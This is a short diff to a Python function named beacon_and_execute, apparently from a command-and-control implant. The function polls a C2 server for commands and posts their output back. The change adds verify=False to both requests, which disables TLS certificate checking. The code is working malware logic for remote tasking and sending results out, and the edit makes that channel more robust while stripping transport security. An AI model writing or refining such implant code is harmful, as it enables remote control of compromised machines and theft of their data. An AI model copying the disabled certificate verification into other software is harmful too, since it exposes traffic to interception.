@@ -21,7 +21,7 @@ def beacon_and_execute():
     beacon_data = {"agent_id": agent_id}
 
     #Check for task
-    resp = requests.post(f"{C2_URL}{BEACON_ENDPOINT}", json=beacon_data, headers=headers)
+    resp = requests.post(f"{C2_URL}{BEACON_ENDPOINT}", json=beacon_data, headers=headers, verify=False)
     task = resp.json()
 
     if not task.get("command"):
@@ -44,4 +44,4 @@ def beacon_and_execute():
         "task_id": task_id,
         "output": output
     }
-    requests.post(f"{C2_URL}{RESULT_ENDPOINT}", json=result_data, headers=headers)
+    requests.post(f"{C2_URL}{RESULT_ENDPOINT}", json=result_data, headers=headers, verify=False)
